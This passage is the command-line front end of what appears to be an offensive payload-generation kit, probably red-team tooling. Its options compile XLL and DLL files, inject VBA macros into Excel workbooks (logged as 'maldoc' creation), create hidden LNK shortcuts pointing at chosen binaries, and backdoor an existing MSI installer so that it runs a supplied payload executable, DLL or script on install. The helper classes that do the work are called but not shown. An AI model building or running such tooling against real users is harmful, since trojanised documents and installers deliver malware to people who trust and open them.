        help='Description for LNK shortcut (default: Shortcut)'
    )

    parser.add_argument(
        '--working-dir',
        help='Working directory for LNK shortcut'
    )

    parser.add_argument(
        '--hide-file',
        action='store_true',
        help='Hide the LNK file (set hidden attribute)'
    )

    # Arguments for MSI backdooring
    parser.add_argument(
        '--msi-file',
        help='Path to source MSI file to backdoor'
    )

    parser.add_argument(
        '--payload',
        help='Path to payload executable or DLL'
    )

    parser.add_argument(
        '--attack-type',
        choices=['execute', 'run-exe', 'load-dll', 'dotnet', 'script'],
        default='execute',
        help='MSI attack vector (default: execute)'
    )

    parser.add_argument(
        '--entry-point',
        help='DLL export or script function name'
    )

    parser.add_argument(
        '--condition',
        default='NOT REMOVE',
        help='MSI execution condition (default: NOT REMOVE)'
    )

    parser.add_argument(
        '--custom-action-name',
        help='Name for custom action (auto-generated if not provided)'
    )

    # Output formatting
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Enable verbose output'
    )

    parser.add_argument(
        '--json',
        action='store_true',
        help='Output results as JSON'
    )

    args = parser.parse_args()

    # Validate arguments based on command
    if args.command in ['xll', 'dll', 'verify']:
        if args.command != 'verify' and not args.source:
            parser.error(f"--source is required for {args.command} command")
    elif args.command == 'excel':
        # For excel: --source is input excel or VBA code, --title is workbook title
        pass  # --output is always required
    elif args.command in ('xlsx', 'xlam'):
        if not args.bas_file:
            parser.error(f"--bas-file is required for {args.command} command")
    elif args.command == 'lnk':
        # For lnk: --target-binary is the target, other args are optional
        if not args.target_binary:
            parser.error("--target-binary is required for lnk command")
    elif args.command == 'msi':
        # For msi: --msi-file and --payload are required
        if not args.msi_file:
            parser.error("--msi-file is required for msi command")
        if not args.payload:
            parser.error("--payload is required for msi command")

    # Load config file if it exists
    config_path = Path(__file__).parent / 'config.ini'
    config = configparser.ConfigParser()
    if config_path.exists():
        config.read(config_path)
        if args.verbose:
            logger.info(f"Loaded configuration from {config_path}")

    try:
        success = False

        if args.command in ('xll', 'dll'):
            # Parse optional extra-flags, defines, and include-dirs
            extra_flags = shlex.split(args.extra_flags) if args.extra_flags else []

            defines: Dict[str, Any] = {}
            if args.defines:
                for token in args.defines.split(','):
                    token = token.strip()
                    if '=' in token:
                        k, v = token.split('=', 1)
                        defines[k.strip()] = v.strip()
                    else:
                        defines[token] = None

            include_dirs = (
                [d.strip() for d in args.include_dirs.split(';') if d.strip()]
                if args.include_dirs else []
            )

            ok, msg = compile_xll(
                source_file=args.source,
                output_path=args.output,
                compiler=args.compiler,
                architecture=args.arch,
                optimization=args.optimize,
                extra_flags=extra_flags,
                defines=defines,
                include_dirs=include_dirs,
                verify=True,
            )
            if not ok:
                logger.error(f"XLL compilation failed: {msg}")
            success = ok

        elif args.command == 'verify':
            is_valid, error = XllCompiler.verify_xll(args.output)
            success = is_valid
            if not is_valid:
                logger.error(f"Verification failed: {error}")

        elif args.command == 'excel':
            try:
                excel = ExcelHelper()
                if args.vba_code:
                    # If VBA code provided, create Excel and inject VBA
                    excel_path = args.output.replace('.xlsm', '_temp.xlsm')
                    success = excel.create_blank_excel(excel_path, args.title)
                    if success:
                        success = excel.add_vba_to_excel(excel_path, args.vba_code, args.output)
                else:
                    # Just create blank Excel
                    success = excel.create_blank_excel(args.output, args.title)
            except Exception as e:
                logger.error(f"Excel creation failed: {e}")
                success = False

        elif args.command in ('xlsx', 'xlam'):
            try:
                helper = ExcelMaldocHelper(prefer_com=not args.no_com)
                ok, msg = helper.from_bas_file(
                    bas_path=args.bas_file,
                    output_path=args.output,
                    source_excel=args.source_excel,
                    fmt=args.command,
                    module_name=args.module_name,
                )
                if not ok:
                    logger.error(f"Maldoc injection failed: {msg}")
                success = ok
            except Exception as e:
                logger.error(f"Maldoc creation failed: {e}")
                success = False

        elif args.command == 'lnk':
            try:
                lnk = LnkHelper()
                success = lnk.create_lnk(
                    target_binary=args.target_binary,
                    arguments=args.arguments,
                    output_path=args.output,
                    icon_path=args.icon,
                    icon_index=args.icon_index,
                    description=args.description,
                    working_dir=args.working_dir
                )
                # Hide file if requested
                if success and args.hide_file:
                    try:
                        lnk.set_file_hidden(args.output)
                        logger.info(f"Set LNK file as hidden")
                    except Exception as e:
                        logger.warning(f"Failed to hide LNK file: {e}")
            except Exception as e:
                logger.error(f"LNK creation failed: {e}")
                success = False

        elif args.command == 'msi':
            try:
                msi = MSIHelper()
                success = msi.backdoor_msi(
                    source_msi=args.msi_file,
                    payload_path=args.payload,
                    output_path=args.output,
                    attack_type=args.attack_type,
                    entry_point=args.entry_point,
                    command_args=args.arguments,
                    custom_action_name=args.custom_action_name,
                    condition=args.condition
                )
            except Exception as e:
                logger.error(f"MSI backdooring failed: {e}")
                success = False

        # Verify output and log results
        if success:
            if success and Path(args.output).exists():
                output_size = Path(args.output).stat().st_size
                logger.info(f"Successfully created: {args.output} ({output_size} bytes)")

        # Output results
        if args.json:
            result = {
                'success': success,
                'command': args.command,
                'output': str(args.output),
                'compiler': args.compiler if args.command in ['xll', 'dll'] else 'N/A',
                'architecture': args.arch if args.command in ['xll', 'dll'] else 'N/A'
            }
            print(json.dumps(result, indent=2))

        return 0 if success else 1

    except Exception as e:
        logger.error(f"Operation failed: {e}")
        if args.json:
            print(json.dumps({
                'success': False,
                'error': str(e)
            }, indent=2))
        return 1


if __name__ == '__main__':
    sys.exit(main())
